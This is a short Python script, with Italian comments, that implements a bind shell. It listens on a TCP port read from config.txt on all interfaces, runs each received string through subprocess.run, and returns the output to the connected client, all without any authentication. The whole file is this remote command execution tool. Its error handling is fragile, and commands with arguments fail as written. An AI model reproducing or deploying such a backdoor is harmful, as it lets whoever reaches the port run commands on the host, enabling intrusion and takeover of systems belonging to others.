import socket, subprocess , sys , time, logging 




logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logfile2.log'), # imposta lo stream su file
        logging.StreamHandler() # imposta lo stream su console
    ]
)







class servershell():
  def __init__(self):
    self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  def infost(self):
   global tes
   tes = 'config.txt'
   try:
    with open(tes,"r") as file:
     newl = file.readlines()
     ports = int(newl[0].strip())
   except Exception as Fileerror:
     print(f"file error {Fileerror}")
     

   

   
   try: 
    self.ip = ''
    self.port = ports
    if self.port:
      self.credentialconnect()

    
   except Exception as error:
      logging.error(error)
      time.sleep(1)
      logging.error("invalid ip address")
      return
 
    


  def credentialconnect(self):
   try:
    self.socket.bind((self.ip,self.port))
   except Exception as e:
    logging.error("error with binding socket")
    time.sleep(1)
    print(e)
   finally:
    try:
     self.socket.listen(1)
     logging.info(f"listening on {self.ip}:{self.port}")
    except Exception:
     logging.error(f"error with listening on:{self.ip}:{self.port}")
    finally:
     self.conn, self.addr = self.socket.accept()
     with self.conn:
      logging.info(f"Connected with {self.addr}")
      while True:
       try:
        self.data = self.conn.recv(1024).decode("latin1",errors="ignore")
       except Exception:
        logging.error("error with receiving data")
       finally:
        try:
         self.resultcmd = subprocess.run(self.data,stdout=subprocess.PIPE, stderr=subprocess.PIPE,errors="ignore")
        except Exception as exc:
         logging.error("error with cmd")
         time.sleep(1)
         logging.error(exc)
        finally:
         self.rst = self.resultcmd.stdout
         self.conn.sendall(self.rst.encode("latin1",errors="ignore"))

if __name__ == "__main__" :

         
  server = servershell()
  server.infost()
     


  
    

     
    

 